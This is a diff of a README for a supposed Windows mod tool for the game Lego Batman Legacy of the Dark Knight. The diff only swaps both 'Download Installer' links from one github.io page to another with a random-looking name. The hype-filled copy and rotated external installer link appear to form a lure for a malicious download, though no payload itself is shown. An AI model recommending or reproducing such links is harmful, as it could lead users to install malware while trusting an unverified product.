@@ -2,7 +2,7 @@
 
 Lego Batman Legacy of the Dark Knight is a popular action-adventure game, and this Mod Tool Suite is designed to enhance your gaming experience on Windows desktops. The tool provides an array of features that unlock hidden content, optimize performance, and allow for extensive customization, making it an essential companion for players seeking to elevate their gameplay.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -73,7 +73,7 @@ Here are answers to some common queries:
 
 To get started, download the latest version of the mod tool from the official GitHub page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This link will always point to the most recent release, ensuring you have access to the newest features and bug fixes for the 2026 version.
 
